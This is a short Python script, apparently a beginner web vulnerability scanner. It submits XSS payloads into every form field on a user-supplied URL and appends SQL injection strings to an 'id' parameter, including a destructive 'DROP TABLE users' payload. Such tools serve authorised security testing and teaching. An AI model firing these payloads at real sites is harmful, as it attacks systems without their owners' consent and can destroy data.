
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# List of test payloads for basic XSS and SQL Injection
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"]

def get_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all(["input", "textarea"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            details["inputs"].append({"type": input_type, "name": input_name})
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {input["name"]: value for input in form_details["inputs"]}
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    print("[*] Scanning for XSS on:", url)
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if payload in response.text:
                print("[-] Possible XSS vulnerability detected in form at:", url)
                break

def scan_sqli(url):
    print("[*] Scanning for SQL Injection on:", url)
    for payload in SQLI_PAYLOADS:
        response = requests.get(url + "?" + "id=" + payload)
        if "sql" in response.text.lower() or "error" in response.text.lower():
            print("[-] Possible SQL Injection vulnerability with payload:", payload)
            break

def main():
    target = input("Enter URL to scan (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        print("Invalid URL. Make sure to include http:// or https://")
        return
    scan_xss(target)
    scan_sqli(target)

if __name__ == "__main__":
    main()
